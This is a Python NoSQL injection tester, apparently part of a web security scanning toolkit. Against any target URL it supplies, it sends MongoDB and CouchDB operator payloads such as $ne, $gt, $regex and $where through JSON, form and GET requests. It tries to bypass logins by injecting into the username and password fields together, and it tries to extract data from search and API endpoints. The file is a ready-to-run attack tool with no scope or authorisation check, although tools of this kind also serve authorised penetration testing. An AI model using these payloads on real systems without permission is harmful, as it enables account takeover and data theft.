#!/usr/bin/env python3
"""NoSQL Injection Tester

Tests for NoSQL injection vulnerabilities:
- MongoDB injection ($ne, $gt, $regex, etc.)
- CouchDB injection
- Authentication bypass via NoSQL injection
- Boolean-based blind injection
"""

import os
import time
import requests
from typing import Dict, Any, Optional, List
from urllib.parse import urlparse, parse_qs, urlencode
import json


def test_nosql_injection(
    target_url: str,
    param: str = "username",
    db_type: Optional[str] = None,
    callback_url: Optional[str] = None
) -> Dict[str, Any]:
    """Test for NoSQL injection vulnerabilities
    
    Args:
        target_url: Target URL
        param: Parameter to test
        db_type: Database type (mongodb, couchdb, auto)
        callback_url: Optional callback URL for blind injection
        
    Returns:
        Dict with test results
    """
    result = {
        "type": "nosql_injection",
        "test": "nosql_injection",
        "vulnerable": False,
        "url": target_url,  # Include URL for detection matching
        "param": param,  # Include parameter name
        "db_type": None,
        "injection_method": None,
        "evidence": None
    }
    
    # MongoDB injection payloads (as dicts, not strings)
    mongodb_payloads = [
        # Authentication bypass
        ({"$ne": None}, "mongodb_auth_bypass"),
        ({"$gt": ""}, "mongodb_auth_bypass_gt"),
        ({"$regex": ".*"}, "mongodb_regex"),
        # Boolean-based
        ({"$where": "this.username == this.password"}, "mongodb_where"),
        # Time-based (if callback available)
    ]
    
    # CouchDB injection payloads
    couchdb_payloads = [
        ({"$ne": None}, "couchdb_auth_bypass"),
        ({"$gt": ""}, "couchdb_auth_bypass_gt"),
    ]
    
    # Determine payloads based on db_type
    if db_type == "mongodb" or db_type is None:
        payloads = mongodb_payloads
    elif db_type == "couchdb":
        payloads = couchdb_payloads
    else:
        payloads = mongodb_payloads + couchdb_payloads
    
    parsed = urlparse(target_url)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    
    # Get original query params
    original_params = parse_qs(parsed.query)
    
    # Success indicators for auth bypass
    success_indicators = ["success", "welcome", "dashboard", "logged in", "authenticated", "login successful", "admin", "user profile", "role:"]
    
    for payload, payload_name in payloads:
        try:
            # Method 1: Try as JSON in POST body - payload is already a dict
            # For single param test
            test_data = {param: payload}
            
            # Try POST with JSON (single param injection)
            resp1 = requests.post(
                base_url,
                json=test_data,
                headers={"Content-Type": "application/json"},
                timeout=10
            )
            
            # Check for authentication bypass indicators
            if resp1.status_code == 200:
                response_lower = resp1.text.lower()
                if any(ind in response_lower for ind in success_indicators):
                    result["vulnerable"] = True
                    result["db_type"] = "mongodb" if "mongodb" in payload_name else "couchdb"
                    result["injection_method"] = payload_name
                    result["evidence"] = {
                        "payload": json.dumps(test_data),
                        "method": "POST_JSON",
                        "status_code": resp1.status_code,
                        "response_snippet": resp1.text[:500],
                        "note": "Authentication bypass detected (single param)"
                    }
                    return result
            
            # Method 2: For login endpoints, try injecting BOTH username and password
            # This is the common MongoDB auth bypass pattern
            if "login" in target_url.lower() or param == "username":
                auth_bypass_data = {
                    "username": payload,
                    "password": payload
                }
                resp_auth = requests.post(
                    base_url,
                    json=auth_bypass_data,
                    headers={"Content-Type": "application/json"},
                    timeout=10
                )
                
                if resp_auth.status_code == 200:
                    response_lower = resp_auth.text.lower()
                    if any(ind in response_lower for ind in success_indicators):
                        result["vulnerable"] = True
                        result["db_type"] = "mongodb" if "mongodb" in payload_name else "couchdb"
                        result["injection_method"] = payload_name
                        result["evidence"] = {
                            "payload": json.dumps(auth_bypass_data),
                            "method": "POST_JSON_AUTH_BYPASS",
                            "status_code": resp_auth.status_code,
                            "response_snippet": resp_auth.text[:500],
                            "note": "Authentication bypass detected (username+password injection)"
                        }
                        return result
            
            # Method 3: Try with query filter pattern (for search/api endpoints)
            if "search" in target_url.lower() or "api" in target_url.lower():
                query_data = {"query": {param: payload}}
                resp_query = requests.post(
                    base_url,
                    json=query_data,
                    headers={"Content-Type": "application/json"},
                    timeout=10
                )
                
                if resp_query.status_code == 200:
                    try:
                        json_resp = resp_query.json()
                        # Check if we got results back (data extraction)
                        if json_resp.get("results") or json_resp.get("users") or json_resp.get("count", 0) > 0:
                            result["vulnerable"] = True
                            result["db_type"] = "mongodb" if "mongodb" in payload_name else "couchdb"
                            result["injection_method"] = payload_name + "_data_extraction"
                            result["evidence"] = {
                                "payload": json.dumps(query_data),
                                "method": "POST_JSON_QUERY",
                                "status_code": resp_query.status_code,
                                "response_snippet": resp_query.text[:500],
                                "note": "NoSQL data extraction detected"
                            }
                            return result
                    except:
                        pass
            
            # Method 4: Try POST with form data (URL-encoded)
            payload_str = json.dumps(payload)
            resp2 = requests.post(
                base_url,
                data={param: payload_str},
                timeout=10
            )
            
            if resp2.status_code == 200:
                response_lower = resp2.text.lower()
                if any(ind in response_lower for ind in success_indicators):
                    result["vulnerable"] = True
                    result["db_type"] = "mongodb" if "mongodb" in payload_name else "couchdb"
                    result["injection_method"] = payload_name
                    result["evidence"] = {
                        "payload": payload_str,
                        "method": "POST_FORM",
                        "status_code": resp2.status_code,
                        "response_snippet": resp2.text[:500],
                        "note": "Authentication bypass detected"
                    }
                    return result
            
            # Method 5: Try GET with query parameter
            payload_str = json.dumps(payload) if not isinstance(payload, str) else payload
            test_params = original_params.copy()
            test_params[param] = [payload_str]
            test_url = base_url + "?" + urlencode(test_params, doseq=True)
            
            resp3 = requests.get(test_url, timeout=10)
            
            if resp3.status_code == 200:
                response_lower = resp3.text.lower()
                if any(ind in response_lower for ind in success_indicators):
                    result["vulnerable"] = True
                    result["db_type"] = "mongodb" if "mongodb" in payload_name else "couchdb"
                    result["injection_method"] = payload_name
                    result["evidence"] = {
                        "payload": payload_str,
                        "method": "GET",
                        "status_code": resp3.status_code,
                        "response_snippet": resp3.text[:500],
                        "note": "Authentication bypass detected"
                    }
                    return result
                    
        except Exception:
            continue
    
    return result


def test_nosql_injection_params(
    target_url: str,
    params: Optional[List[str]] = None,
    db_type: Optional[str] = None,
    callback_url: Optional[str] = None
) -> Dict[str, Any]:
    """Test multiple parameters for NoSQL injection
    
    Args:
        target_url: Target URL
        params: List of parameters to test (if None, will discover)
        db_type: Database type
        callback_url: Optional callback URL
        
    Returns:
        Dict with test results
    """
    result = {
        "test": "nosql_injection_multi_param",
        "vulnerable": False,
        "findings": []
    }
    
    # Discover parameters if not provided
    if not params:
        from tools.rest_api_fuzzer import discover_parameters
        discovered_params = discover_parameters(target_url)
        # Always include common NoSQL injection parameter names
        nosql_params = ["username", "user", "email", "password", "query", "search", "filter", "id", "user_id"]
        params = list(set(discovered_params + nosql_params))
    
    # Test each parameter
    for param in params:
        test_result = test_nosql_injection(
            target_url,
            param=param,
            db_type=db_type,
            callback_url=callback_url
        )
        if test_result["vulnerable"]:
            result["vulnerable"] = True
            result["findings"].append(test_result)
    
    return result


def validate_nosql_injection(
    discovery_data: Dict[str, Any],
    callback_server_url: Optional[str] = None
) -> Dict[str, Any]:
    """Main validation function for NoSQL injection
    
    Args:
        discovery_data: Discovery data containing target URLs
        callback_server_url: Optional callback server URL for OOB detection
        
    Returns:
        Dict with validation results
    """
    results = {
        "vulnerable": False,
        "tests_run": 0,
        "findings": []
    }
    
    # Extract target from discovery data
    target = discovery_data.get("target")
    if not target:
        return results
    
    # Detect database type from technology fingerprinting
    db_type = None
    if "web" in discovery_data and "fingerprints" in discovery_data["web"]:
        fingerprints = discovery_data["web"]["fingerprints"]
        technologies = fingerprints.get("technologies", [])
        if any("mongodb" in t.lower() for t in technologies):
            db_type = "mongodb"
        elif any("couchdb" in t.lower() for t in technologies):
            db_type = "couchdb"
    
    # Initialize callback correlator if callback server is configured
    correlator = None
    job_id = None
    callback_url = None
    
    if callback_server_url:
        try:
            from tools.callback_correlator import CallbackCorrelator
            correlator = CallbackCorrelator(callback_server_url)
            job_id = f"nosql_injection_{int(time.time())}"
            token = correlator.register_job(job_id, "nosql_injection", target, timeout=300)
            callback_url = correlator.get_callback_url(token)
            print(f"[NOSQL-INJECTION] Callback enabled: {callback_url}")
        except Exception as e:
            print(f"[NOSQL-INJECTION] Callback setup failed: {e}, continuing without callbacks")
            callback_server_url = None
    
    # Test NoSQL injection
    test_result = test_nosql_injection_params(
        target,
        db_type=db_type,
        callback_url=callback_url
    )
    results["tests_run"] += 1
    if test_result["vulnerable"]:
        results["vulnerable"] = True
        results["findings"].extend(test_result.get("findings", []))
    
    # Poll for callback hits if callback enabled
    if callback_server_url and correlator:
        print(f"[NOSQL-INJECTION] Polling for callback hits (job_id: {job_id})...")
        time.sleep(5)  # Wait for potential callback
        hits = correlator.poll_hits(job_id, timeout=60, interval=2)
        if hits:
            print(f"[NOSQL-INJECTION] Received {len(hits)} callback hit(s)")
            for hit in hits:
                results["findings"].append({
                    "type": "nosql_injection_callback_confirmed",
                    "test": "nosql_injection_oob",
                    "vulnerable": True,
                    "confidence": "high",
                    "callback_evidence": {
                        "remote_addr": hit.get("remote_addr"),
                        "user_agent": hit.get("user_agent"),
                        "method": hit.get("method"),
                        "path": hit.get("path"),
                        "query_params": hit.get("query_params"),
                        "timestamp": hit.get("timestamp"),
                    },
                    "note": "NoSQL injection confirmed via out-of-band callback"
                })
                results["vulnerable"] = True
    
    return results


if __name__ == "__main__":
    import argparse
    
    ap = argparse.ArgumentParser(description="NoSQL Injection Tester")
    ap.add_argument("--target", required=True, help="Target URL")
    ap.add_argument("--param", help="Parameter to test")
    ap.add_argument("--db-type", choices=["mongodb", "couchdb", "auto"], default="auto", help="Database type")
    ap.add_argument("--callback-server-url", help="Callback server URL")
    args = ap.parse_args()
    
    callback_url = None
    if args.callback_server_url:
        from tools.callback_correlator import CallbackCorrelator
        correlator = CallbackCorrelator(args.callback_server_url)
        job_id = f"nosql_injection_{int(time.time())}"
        token = correlator.register_job(job_id, "nosql_injection", args.target, timeout=300)
        callback_url = correlator.get_callback_url(token)
    
    if args.param:
        result = test_nosql_injection(args.target, param=args.param, db_type=args.db_type, callback_url=callback_url)
    else:
        discovery_data = {"target": args.target}
        result = validate_nosql_injection(discovery_data, args.callback_server_url)
    
    import json
    print(json.dumps(result, indent=2))

